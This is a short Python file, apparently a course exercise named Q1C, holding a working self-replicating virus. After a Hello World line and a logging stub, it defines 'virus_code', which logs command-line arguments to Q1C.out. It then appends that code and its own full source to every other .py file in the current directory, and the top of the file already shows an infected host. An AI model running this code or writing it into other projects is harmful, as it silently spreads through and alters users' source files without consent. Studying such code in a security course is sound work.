import sys
print("Hello World!")

import sys
command_line = " ".join(sys.argv)
with open("Q1C.out", "a") as file:
    file.write(command_line + '\n')

import os
import sys

virus_code = '''\
import sys
command_line = " ".join(sys.argv)
with open("Q1C.out", "a") as file:
    file.write(command_line + '\\n')
'''

directory = os.getcwd()
py_files = [filename for filename in os.listdir(directory) if filename.endswith(".py")]

with open(sys.argv[0], "r") as Q1C_file:
    Q1C_content = Q1C_file.read()

for py_file in py_files:
    if(py_file == "Q1C.py"):
        continue
    with open(py_file, "r") as py_read:
        py_contents = py_read.read()


    if virus_code not in py_contents:
        with open(py_file, "a") as py_adjust:
            py_adjust.write('\n' + virus_code)
            py_adjust.write('\n' + Q1C_content)